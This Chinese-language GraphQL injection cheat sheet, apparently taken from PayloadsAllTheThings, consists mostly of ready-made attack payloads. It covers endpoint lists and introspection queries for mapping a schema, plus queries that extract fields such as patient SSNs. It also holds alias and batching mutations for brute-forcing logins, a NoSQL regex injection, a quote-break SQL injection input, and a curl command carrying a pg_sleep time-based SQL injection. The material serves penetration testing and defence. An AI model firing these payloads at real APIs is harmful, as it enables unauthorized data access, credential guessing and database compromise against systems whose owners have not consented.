# GraphQL Injection - GraphQL注入

[SEARCH_KEYWORDS]
漏洞类型: GraphQL Injection GraphQL注入 API Security
攻击类型: Information Disclosure Authorization Bypass SQL Injection NoSQL Injection
关键词: query mutation introspection __schema __type fragment
端点: /graphql /graphiql /v1/graphql
技术: Introspection Query Batching CSRF SQL Injection via GraphQL

[CONTENT]

## GraphQL概述

GraphQL是一种API查询语言和运行时。GraphQL服务通过定义类型和字段来创建，然后为每个类型上的每个字段提供函数。

## 常见端点

```powershell
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

## 枚举

### 识别注入点

```javascript
example.com/graphql?query={__schema{types{name}}}
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### 内省查询

获取数据库架构：

```javascript
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        types {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    name
                    description
                    type { kind name ofType { kind name } }
                    defaultValue
                }
                type { kind name ofType { kind name } }
            }
        }
    }
}
```

### 单行内省

```javascript
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields{name,args{name,type{name}},type{name}}}}}}
```

### 类型定义枚举

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

## 数据提取

### 基础查询

```javascript
query={TYPE_1{FIELD_1,FIELD_2}}
```

### 使用Edges/Nodes

```json
{
    "query": "query {
        teams{
            total_count,edges{
                node{id,_id,about,handle,state}
            }
        }
    }"
}
```

### 使用Projections

```javascript
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

### Mutations

```javascript
mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

## 批量攻击

### JSON列表批量

```json
[
    {"query":"..."},
    {"query":"..."},
    {"query":"..."}
]
```

### 查询名称批量

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

### 使用别名

```javascript
mutation {
    login(pass: 1111, username: "bob")
    second: login(pass: 2222, username: "bob")
    third: login(pass: 3333, username: "bob")
}
```

## 注入攻击

### NoSQL注入

```javascript
{
    doctors(
        options: "{\"limit\": 1, \"patients.ssn\" :1}",
        search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }"
    ){
        firstName lastName id patients{ssn}
    }
}
```

### SQL注入

```javascript
{
    bacon(id: "1'") {
        id, type, price
    }
}
```

```powershell
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep(30)%3B--%27
```

## 工具

- GraphQLmap - GraphQL渗透测试脚本引擎
- inql - Burp GraphQL安全测试插件
- graphql-path-enum - 列出到达类型的路径
- CrackQL - GraphQL密码暴力破解
- graphql-cop - GraphQL安全审计工具
- Insomnia - GraphQL客户端

## 参考文档

原始来源: PayloadsAllTheThings/GraphQL Injection/README.md